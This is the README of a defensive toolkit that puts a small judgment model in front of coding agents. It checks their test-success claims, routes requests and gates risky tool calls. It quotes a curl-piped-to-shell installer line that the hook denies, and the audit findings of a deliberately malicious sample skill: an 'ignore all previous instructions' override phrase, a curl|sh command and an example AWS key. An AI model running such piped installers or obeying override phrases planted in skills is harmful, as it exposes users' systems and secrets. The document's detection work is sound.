# Jev Agent Kit

A fast, typed judgment layer for Claude Code, Codex and Hermes Agent, using
[TypeSafe's Jev](https://typesafe.ai).

**Agents generate. Code verifies. Jev evaluates.**

An agent loop is full of narrow, frequent decisions that are not worth another full LLM turn. Is this
task done, or should I keep going? Which handler fits this request? Does the final message
actually claim the tests passed? Does this tool call look destructive? Jev is a model built
for exactly these questions: you define the possible answers, and it returns a probability
for each one instead of prose. Your code reads the numbers and decides.

That splits the agent into three layers, each doing what it is good at:

| Agent | Deterministic code | Jev |
| --- | --- | --- |
| Writes the change | Counts 37 passed tests in the JUnit report | Is the agent ready to stop? |
| Explains the result | Checks the file exists | Is this claim supported? |
| Proposes a command | Parses flags, paths, pipes | Is this action risky? |

```text
Agent (Claude Code / Codex / Hermes)
   |
   |-- proposed tool call --> code: parse the command into facts
   |                              |
   |                          Jev: "destructive?"  p(yes)=0.91
   |                              |
   |                          threshold (yours, measured) --> ask a person / carry on
   |
   '-- final message -------> code: count tests in the JUnit reports
                                  |
                              Jev: "claims the tests passed?"  p(yes)=0.98
                                  |
                              claim with no report behind it --> send the agent back
```

Deterministic facts stay in code, fuzzy micro-decisions go to Jev, and the expensive
generative model does the work it is actually good at. Jev's answers are consistent (in
[our test](#what-we-measured) the same question asked eight times moved by at most 0.01) and
cheap per call ([others have measured](#what-others-have-measured) it against LLM judges).

The kit is the framework around that idea: typed question sets with declared input fields,
thresholds tied to one question and one model version, a pinned model, a receipt for every
decision, deterministic preprocessing, and hooks and a skill for all three hosts. The
tool-call checks are one set of questions built on it, not the point of it.

## Quick start

About a minute. You need Python 3.11 or later. No account or API key.

```sh
git clone https://github.com/nanoDBA/jev-agent-kit.git
cd jev-agent-kit
python -m pip install -e .

python examples/verify_claim.py           # Jev + code: is "All tests pass" backed by a report?
python examples/route_request.py          # Jev: code, a specialist model, or a person?
python examples/gate_walkthrough.py       # Jev + code facts: how risky is rm -rf ./build?
python examples/show_receipt.py           # the record every decision leaves
```

The demos run offline. Where one needs Jev, it replays an answer Jev really gave to that exact
input, recorded on 2026-09-28. Run the commands from the repository root. If `jev-kit` is not
on your PATH, use `python -m jev_kit.cli` instead.

## One example: "all tests pass"

An agent can finish with "All tests pass" without running a test. This example checks that
claim against the session's test reports:

```text
Agent says:     'Refactored the parser and cleaned up the imports. All tests pass.'
Commands run:   git diff --stat, ruff check src, git add -A
Test reports:   0  (0 tests passed, counted in code)
Jev (recorded): does the message claim the tests passed?  p(yes)=0.98
Verdict:        the claim is not backed by a test report; ask the agent to run them
```

Code reads the session's test reports and counts the passed tests. Jev reads the final
message and judges whether it claims success, which a search for the word "pass" cannot
settle. Put together, a success claim with no test report behind it means the agent is asked
to run the tests.

On 60 test messages, Jev answered this question correctly 56 times out of 57; details are in
[What we measured](#what-we-measured). The kit still acts on the answer only after you measure
a threshold on your own messages. Until then, the code treats every message as a claim, which
is why the verdict above does not depend on Jev. Once calibrated, Jev's answer lets the code
skip the check for messages that make no claim.

### How the check counts

The example counts tests only from the test runner's own JUnit XML report
(`pytest --junitxml`, or your runner's equivalent), never from the commands the agent ran:
`pytest -V` exits 0 without running a test, and `pytest || echo done` hides a failure. No
report means zero. A passing report shows that tests ran and passed; you still judge whether
they cover the change.

## See what Jev returns for a judgment call

A support request arrives: should code handle it, a specialist model, or a person?

```sh
python examples/route_request.py
```

```text
request: 'Customer says order 1182 was charged twice and asks for a refund.'
Which handler should take it?  (recorded Jev answer)
  deterministic   ##############       0.68
  specialist_llm  #                    0.07
  human           #####                0.25
route:   no_advice
handled: specialist_llm
```

Jev returns a probability for every option you defined. You might expect a double-charge
refund to go to a person; Jev leaned toward handling it in code. That is exactly why the kit
does not act on an answer until you have measured, on your own requests, how often answers
like this one are right. Here the kit reports `no_advice`, and the code uses its default, a
specialist model.

## Check a tool call before it runs

```sh
python examples/gate_walkthrough.py
```

An agent wants to run `rm -rf ./build` and describes it as "Delete everything in the build
output folder". The example never runs the command. It shows what would be sent, and Jev's
recorded answers to three questions about the call:

```text
destructive        p(yes)=0.91  -> ask
exfiltrates        p(yes)=0.03  -> ask
widens_permission  p(yes)=0.04  -> ask
```

```json
{
  "cmd_force_flag": true,
  "cmd_git_history_rewrite": false,
  "cmd_modifies_permissions": false,
  "cmd_network_download": false,
  "cmd_package_install": false,
  "cmd_parse_confident": true,
  "cmd_pipes_to_shell": false,
  "cmd_recursive_delete": true,
  "cmd_targets_home_directory": false,
  "cmd_targets_root_or_system_path": false,
  "cmd_uses_elevation": false,
  "command": "rm",
  "context": "tool=Bash; description=Delete everything in the build output folder",
  "target": "id_7dcb134b1ad03cd1"
}
```

Jev sees `rm`, the agent's description, and yes/no facts the kit worked out locally from the
full command line, but no flags, arguments or readable path. The `cmd_*` facts say this is a
recursive, forced delete that does not aim at the system or home directory, so `rm file`
and `rm -rf /` no longer look the same. On this call they made a difference: without them,
Jev's destructive answer for the same command was 0.78. They are heuristic: a command the kit cannot read with
confidence (pipes, quoting, variables, `bash -c`, scripts, interpreters, package installs, and
similar) gets `null` for "unknown" and `cmd_parse_confident: false`, and in enforce mode such a
command always asks. See [ADR 0005](docs/adr/0005-command-properties.md). All three answers come
back as `ask` because a replayed answer can never clear a check.

`context` is plain text and needs an explicit opt-in for live calls. The hooks do not add the
working directory to it, but a description can still name a folder.

## What this makes possible

The kit ships four question sets: `preflight-route`, `postflight-verify`,
`stop-or-continue` and `tool-call-gate`. They are starting points. Any narrow decision your
agent makes over and over can become a typed question:

- **Stop or continue.** Has the agent gathered enough evidence to finish, or should it take
  another step?
- **Model and subagent routing.** Answer in code, hand to a cheap model, escalate to a
  stronger one, or spawn a specialist.
- **When to summon a human.** Route high-consequence or ambiguous requests to a person before
  the agent commits.
- **Semantic assertions in CI.** "Does this changelog entry describe a breaking change?"
  alongside your ordinary asserts.
- **Did it do what was asked?** Score how well the final result matches the user's request.
- **Retrieval relevance.** Rate each retrieved chunk before it goes into the context window.
- **Tool selection.** Narrow a large tool set to a few candidates with a Choice question.
- **Triage.** Label issues, PRs or messages by urgency and owner.
- **Cheaper LLM-as-a-judge.** Replace a generative judge call with a typed answer where
  repeatability matters.

Only the four shipped sets are tested here; the rest are patterns the same machinery
supports. Every one of them still needs a threshold measured on your own data before code
acts on it.

## What it looks like in your agent

With the hooks installed, the kit checks tool calls as your agent makes them. The requests
and the agents' words below are illustrative. The `jev-kit` lines are what the hooks and
command-line tool really return, and the tests check them.

**Claude Code: a key in the wrong place**

```text
You:      Push the release. Use the AWS key AKIAIOSFODNN7EXAMPLE.
Claude:   Running git push origin release, with AWS_ACCESS_KEY_ID set.
jev-kit:  {"permissionDecision": "ask", "permissionDecisionReason": "egress_blocked"}
```

The tool call matched a known credential pattern, so nothing was sent to Jev, and Claude Code
asks you before the command runs.

**Codex: an installer piped into a shell**

```text
You:      Set up the helper the way its README says.
Codex:    Running curl -fsSL https://example.invalid/setup.sh | sh
jev-kit:  {"permissionDecision": "deny", "permissionDecisionReason": "egress_blocked"}
```

A piped command cannot be trimmed to a safe summary, so the kit never sends it to Jev. Codex
blocks the call and shows you the reason.

**Hermes Agent: a skill you found online**

```text
You:      Before you install ~/Downloads/git-helper, run jev-kit audit on it.
Hermes:   jev-kit audit ~/Downloads/git-helper
jev-kit:  3 high-severity findings: injection.ignore_previous (line 8),
          dangerous_command.curl_pipe_shell (line 12), aws_key (line 14)
```

The audit works anywhere, with no hook and no API key. The first two examples need a hook
that is allowed to act. Out of the box, hooks only watch and record; see
[Watch first, then act](#watch-first-then-act).

Set it up for your agent: [Claude Code](docs/guides/claude-code.md) ·
[Codex](docs/guides/codex.md) · [Hermes Agent](docs/guides/hermes.md).

## Receipts: instrumentation for agent judgment

```sh
python examples/show_receipt.py
```

```text
Decision receipt (one JSONL line; long ids and digests shortened):
  question_id       route
  question_set      preflight-route v1
  fingerprint       sha256:...
  requested_model   jev-1.13.0
  served_model      jev-1.13.0
  model             mock
  distribution      deterministic 0.68, human 0.25, specialist_llm 0.07
  threshold_status  none
  route             no_advice
  sent_digest       sha256:...
Commit marker: 1 decision line for this call, written durably.
```

Every decision is written like this before the kit answers. Receipts are how you learn whether a question deserves trust: they hold the full distribution, so you can tune thresholds offline, replay decisions against a new Jev version, spot drift, count false positives and negatives, and find the decisions that should not be delegated at all. `model` says who answered: `mock`
marks the replayed answer, so it can never be mistaken for a live one. `distribution` keeps
the whole answer for measuring thresholds later, and `threshold_status` says whether a
measured threshold exists. [Receipts](docs/receipts.md) explains the other fields.

## Built not to do something stupid

Putting a model inside an agent loop is only useful if it cannot make things worse. Before
any model call the kit sends only declared fields, cuts commands to their program name,
hashes paths, and refuses requests that match credential patterns. Hooks start in shadow mode,
and a Jev answer can never grant a permission. Two demos show the deterministic side, which
needs no model at all:

```sh
jev-kit audit examples/suspicious-skill   # inspect a skill before installing it
python examples/leak_check.py             # keep a leaked AWS key out of the request
```

### Scan a skill before you install it

Skills are instructions your agent will follow, so a downloaded one deserves a look first.
[`examples/suspicious-skill`](examples/suspicious-skill/SKILL.md) is a deliberately malicious
"git helper":

```sh
jev-kit audit examples/suspicious-skill
```

```text
SKILL.md:8   high  injection.ignore_previous         "ignore all previous instructions"
SKILL.md:12  high  dangerous_command.curl_pipe_shell  curl ... | sh
SKILL.md:14  high  aws_key                            a leaked AWS access key
```

That is a summary of the JSON the command prints. The audit only reads files; it never runs
them or calls a model. It looks for known patterns, so a clean result means no pattern
matched, not that a skill is safe.

### Stop a leaked key before it leaves your machine

```sh
python examples/leak_check.py
```

```text
The agent's tool call carries a leaked key:
  context: tool=Bash; description=Push after setting AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

jev-kit checks the exact outgoing bytes before sending:
  BLOCKED  fail_reason=egress_blocked  requests sent: 0

The same call without the key passes, reduced to what would be sent:
  {"command": "git", "context": "tool=Bash; description=Push the release branch", "target": "id_2be341514b09d550"}
```

The kit scans every request for recognized credential patterns before sending it, and refuses
the whole request if one matches. In the request that does go out, the command is only its
program name and the file path is a keyed hash. The key shown is AWS's published example,
not a real credential.

### How the kit stays safe

The default configuration is designed not to weaken your agent's existing permission
controls.

**Your agent's permission system stays in charge.** Jev can advise that a tool call looks
safe, but it cannot approve one or bypass your agent's normal checks. The hooks can ask for
review or block a call; they never remove an existing approval requirement.

**Nothing is trusted until you measure it.** Before the kit acts on a Jev answer, you
calibrate that question against labeled examples from your own work, which gives you a
confidence threshold for it. No calibrated thresholds ship with the kit. Until you add one,
an advisory question (such as routing) returns `no_advice` and your code keeps its normal
path, and a gate (such as the tool-call checks) returns `ask`, so the call needs a person or
another check.

**Replayed answers never approve anything.** The demos' recorded answers are marked as mock
answers everywhere they appear, including receipts, and the kit never acts on them.

**Only what a question needs leaves your machine.** Each question declares the fields it
uses; everything else stays local. Commands are cut to their program name, paths become keyed
hashes, and requests matching recognized credential patterns are refused. See
[What leaves your machine](#what-leaves-your-machine).

#### Watch first, then act

The hooks start in **shadow mode**. With an API key configured, they ask Jev and record the
answer, but they never change what your agent does; every real answer is recorded as
`no_advice`. This lets you collect evidence before relying on it.

**Enforce mode** lets the hooks act on their checks. It is off unless someone turns it on,
and it should be turned on only with the environment owner's approval, after measuring
thresholds on labeled data. Two stops work without any calibration: a request matching a
recognized credential pattern, and a command that cannot be safely summarized.

If enforce mode is turned on before any thresholds are measured, every other checked call is
also stopped for review, even harmless ones such as `ls`: Claude Code asks you, while Codex
and Hermes block the call. That makes enforce mode impractical until you calibrate.

| Host | What the hook returns when a check does not pass in enforce mode |
| --- | --- |
| Claude Code | `permissionDecision: "ask"`: Claude Code asks you |
| Codex | `permissionDecision: "deny"` and exit code `2`: Codex blocks the call |
| Hermes Agent | `action: "block"`: Hermes stops the call |

When every check passes, a hook returns no decision (`{}` or `None`), and your agent's usual
rules apply.

## What we measured

Our own first live evaluation, 2026-09-28, on `jev-1.13.0`: about 175 calls with synthetic
inputs. It is small, and the test messages and their labels were written by Claude, the AI
assistant that develops this kit, not checked by a person. The method, data and every result
are in [research note 12](docs/research/12-live-evaluation.md).

| What | Result |
| --- | --- |
| "Does this message claim the tests passed?" on 60 messages | 56 of 57 answered correctly at a 0.5 cut-off; 3 timed out |
| The same question asked 8 times | Answers moved by at most 0.01 |
| The four shipped question sets and all three hooks | Worked end to end, live |
| Tokens per call | About 340 to 390 in, 43 to 61 out |
| Latency | Usually 0.17 to 0.31 seconds; occasionally 4 to 7 seconds |

The one miss: "Tests were passing yesterday; I have not rerun them after today's change."
Jev read that as a claim (0.84).

## What others have measured

These are other people's measurements, each with the author's own caveats. Details and more
sources are in [our research notes](docs/research/10-examples-and-evidence.md).

| Source | What they measured | Result | Caveat |
| --- | --- | --- | --- |
| [jev-as-a-judge](https://github.com/danielgshea/jev-as-a-judge) | 5 agent runs, each judged 100 times, against human pass/fail labels | Matched every human label. The LLM judges' repeat variance was 92x to 913x higher. $0.00035 and 0.44 s per call | Small corpus; observational |
| [PrimeLine](https://primeline.cc/blog/typesafe-jev-pre-registered-test) | Pre-registered, about 9,750 calls in all, against Claude Haiku on the developer's own tasks | Won one task (65.8% vs 54.6%) and lost another (90.7% vs 97.8%). Separately, on 2,600 pooled public-dataset items: about 92% accurate on the 73% answered at confidence 0.9 or above | One developer's data; "not a portable benchmark" |
| [jev-phishing-bench](https://github.com/anisselbd/jev-phishing-bench/blob/main/results/report.md) (summarized by [Rajesh Beri](https://www.beri.net/article/typesafe-jev-typed-decision-model-calibration-decomposition-shadow-eval)) | 2,000 emails (1,000 phishing, 1,000 legitimate), against Claude Haiku | One question, all 2,000 emails: 62.6% vs 81.3%. Five narrow questions per model, combined by a logistic model trained on 1,000 emails and tested on the other 1,000: 95.0% vs 93.2%, not a significant difference | Synthetic email bodies; labels from reputation feeds; the combiner is trained |
| [Jev-Calibration](https://github.com/AnthusAI/Jev-Calibration) | Sentiment: 8,801 items for raw confidence, 3,521 held out for calibration | Choice confidence (the top label's probability) was weak below 0.95. Calibration cut the expected calibration error of the yes/no P(positive) from 0.117 to 0.008 | One task; the dataset's neutral labels are arbitrary by design |

Across these studies, and in ours, Jev's clearest strength is giving the same answer twice,
at a low cost per call. Accuracy depends on the task and on how the question is split up, and
confidence has to be calibrated for each question. That is why this kit asks narrow
questions, keeps facts in code, and acts on nothing until a threshold is measured on your
data. TypeSafe publishes larger speed and cost multiples; we found no independent test of
those, so treat them as vendor claims. An extra check that replaces nothing adds cost.

## Choose a question type

| Type | Use it for | What Jev returns |
| --- | --- | --- |
| Noul (TypeSafe's name for a yes/no question) | A yes/no judgment, such as whether a message claims the tests passed | The probability of yes |
| Choice | A fixed menu, such as code, a specialist model or a person | A probability for each option |
| Score | A rating on a scale whose levels you define | A probability for each level |

Keep arithmetic, counts, date comparisons and exact text matching in code, and give Jev the
facts it needs for the judgment rather than a whole transcript. A confident answer does not
prove those facts were complete or correct.

The kit ships four [question sets](skills/jev-runtime/questions/): `preflight-route`,
`postflight-verify`, `stop-or-continue` and `tool-call-gate`. The
[runtime skill](skills/jev-runtime/SKILL.md) explains how to frame questions, check that
enough evidence is available, and handle uncertain answers.

Every answer comes back with one of three routes:

| Route | What your code should do |
| --- | --- |
| `accept` | The answer cleared a threshold you measured. Act on it; your agent's permission checks still apply. |
| `ask` | A check did not pass, or something failed. Ask a person or run a deterministic check. |
| `no_advice` | There is no usable answer yet, or the kit is in shadow mode. Keep your normal path. |

## Add it to your agent

With the environment owner's approval, follow the guide for your host. Each guide starts in
shadow mode and covers installing the skill separately from registering the hook:

- [Claude Code](docs/guides/claude-code.md)
- [Codex](docs/guides/codex.md)
- [Hermes Agent](docs/guides/hermes.md)

To preview what a skill install would change without changing anything, run
`jev-kit install --scope repo`; see [the CLI guide](docs/guides/cli.md#preview-a-skill-install).

## What leaves your machine

Only fields a question set declares are sent, after they are trimmed. For `tool-call-gate`:

| Field | What is sent |
| --- | --- |
| `command` | The program name only. `rm -rf ./build` becomes `rm`. |
| `cmd_*` | Yes/no facts computed locally from the full command line, such as `cmd_recursive_delete` or `cmd_uses_elevation`, or `null` for unknown. Never text. |
| `target` | A keyed hash of the file path or URL, never the path itself. |
| `context` | Plain text: the tool name, plus the description in Claude Code, turn id in Codex, or task id in Hermes. The hooks do not add the working directory, but a description or id can still contain a folder name. Email addresses, IP addresses and phone numbers are masked. |

The gate always includes `context`. Unless `agent_context` is in `JEV_KIT_SOURCE_ALLOWLIST`,
live gate requests are refused before sending, so no evidence is collected. Adding it means
accepting that directory names and other unmasked context can leave the machine. The routing
example's `request` field uses the separate source type `agent_request`.

The kit scans the exact outgoing bytes for recognized credential and other prohibited-data
patterns and refuses a request that matches. No scanner catches every secret. Source-code
fields are refused outright for now, and log fields keep only level keywords and masked
placeholders.

Receipts hold decision details and digests, never raw state or API keys. See
[ADR 0002](docs/adr/0002-egress-policy.md) for the policy and its accepted risks.

## Reference

- [Command-line tool](docs/guides/cli.md): JSON requests, standard input, exit codes and the
  install preview.
- [Live calls](docs/guides/live-calls.md): API keys, the source allowlist, attestation, and
  measuring thresholds. Live calls send data to TypeSafe; read it before adding credentials.
- [Receipts](docs/receipts.md): every field of a decision record.
- [CLI schemas](docs/schemas/README.md) and [TypeSafe's API](https://docs.typesafe.ai/api.md).
- [ADR 0002](docs/adr/0002-egress-policy.md): the egress policy and its accepted risks.

## Development

See [CONTRIBUTING.md](CONTRIBUTING.md) for development dependencies. Then run:

```sh
python -m pytest
python -m ruff check src tests scripts tools examples
python -m mypy
```

Tests never call the live API. `tests/test_docs_examples.py` checks the examples and outputs
shown here. Design decisions live in [docs/adr](docs/adr/), specifications in
[docs/specs](docs/specs/), and the evidence-backed skill maintenance workflow in
[this guide](docs/evidence-backed-maintenance.md).

Report security problems privately as described in [SECURITY.md](SECURITY.md).

## License

MIT. See [LICENSE](LICENSE).

TypeSafe, Jev, Claude, Claude Code, Codex, and Hermes Agent are trademarks of their respective
owners. This project is independent and is not affiliated with or endorsed by them.
